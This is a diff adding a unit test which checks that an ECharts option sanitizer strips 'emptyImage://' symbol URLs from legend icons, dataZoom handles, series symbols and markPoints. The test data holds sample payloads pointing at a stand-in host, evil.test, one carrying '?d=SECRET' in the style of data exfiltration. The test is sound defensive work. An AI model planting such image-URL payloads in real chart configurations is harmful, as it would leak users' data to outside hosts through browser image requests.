@@ -53,6 +53,26 @@ describe('the real ECharts', () => {
         expect(svg).not.toMatch(/<image/);
     });
 
+    it('draws no picture from an emptyImage:// symbol either, in any place a symbol is read', () => {
+        // ECharts strips "empty" from a symbol and then looks for image://, so this is a picture.
+        const raw = {
+            legend: { data: ['s'], icon: 'emptyImage://https://evil.test/legend.png?d=SECRET' },
+            dataZoom: [{ type: 'slider', handleIcon: 'emptyimage://https://evil.test/handle.png' }],
+            xAxis: { data: ['a'] },
+            yAxis: {},
+            series: [{
+                name: 's', type: 'line', data: [{ value: 1, symbol: 'emptyimage://https://evil.test/item.png' }],
+                symbol: 'emptyImage://https://evil.test/sym.png',
+                markPoint: { symbol: 'emptyImage://https://evil.test/pin.png', data: [{ type: 'max' }] },
+            }],
+        };
+        // The case is real: unsanitized, the browser would be asked for these.
+        expect(draw(raw as never)).toMatch(/<image/);
+        const svg = draw(sanitizeEChartsOption(raw)!);
+        expect(svg).not.toContain('evil.test');
+        expect(svg).not.toMatch(/<image/);
+    });
+
     it('writes no escaped url() into a fill or a stroke', () => {
         // Unsanitized, ECharts copies each of these into `fill="…"` verbatim, and CSS reads
         // every one as `url(`: the browser would fetch the address.
